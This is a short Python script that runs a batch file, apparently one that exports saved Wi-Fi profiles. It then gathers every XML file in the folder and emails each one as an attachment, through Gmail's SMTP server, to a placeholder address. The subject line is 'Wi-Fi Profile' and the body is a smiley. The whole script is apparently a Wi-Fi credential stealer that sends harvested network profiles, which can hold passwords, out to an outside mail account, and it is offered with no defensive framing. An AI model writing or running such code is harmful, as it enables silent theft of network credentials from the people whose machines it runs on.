import smtplib
from subprocess import call
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time
import glob

def test():
  ok = glob.glob('*.xml')
  alright = ("[]".join(ok))
  x = alright.replace("[]", "\n")
  print(x)
  f = open("1.txt", "a")
  f.write(x)
  f.close()
  with open('1.txt', 'r') as f:
       for line in f:
         temp = line.rstrip('\n')
         print(temp)
         time.sleep(5)
         fromaddr = "MY_EMAIL@gmail.com"
         toaddr = "MY_EMAIL@gmail.com"

         msg = MIMEMultipart()

         msg['From'] = fromaddr
         msg['To'] = toaddr
         msg['Subject'] = "Wi-Fi Profile"
		
         body = ":)"



         msg.attach(MIMEText(body, 'plain'))
         
         filename = temp
         attachment = open(filename, "rb")

         part = MIMEBase('application', 'octet-stream')
         part.set_payload((attachment).read())
         encoders.encode_base64(part)
         part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

         msg.attach(part)


         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
         server.login(fromaddr, "My_Password")
         text = msg.as_string()
         server.sendmail(fromaddr, toaddr, text)
         server.quit()
         

numberEmails = 1

for _ in range(numberEmails):
    call(['profiles.bat'], shell=False)
    test()
    open('1.txt', 'w').close()
